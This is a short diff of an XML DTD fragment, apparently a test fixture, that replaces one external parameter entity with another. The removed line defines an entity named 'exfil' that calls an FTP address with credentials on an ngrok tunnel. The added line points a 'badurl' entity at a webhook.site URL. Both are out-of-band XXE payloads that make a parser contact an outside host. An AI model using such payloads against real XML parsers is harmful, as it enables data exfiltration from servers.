@@ -1,2 +1,2 @@
-<!ENTITY % exfil SYSTEM "ftp://xxe:xxe@0.tcp.ap.ngrok.io:11045/just-testing-no-special-chars">                
-%exfil;
+<!ENTITY % badurl SYSTEM "http://webhook.site/30c2aa19-72f5-4b14-9d14-d66839eb41f4/test<bad>chars">           
+%badurl; 
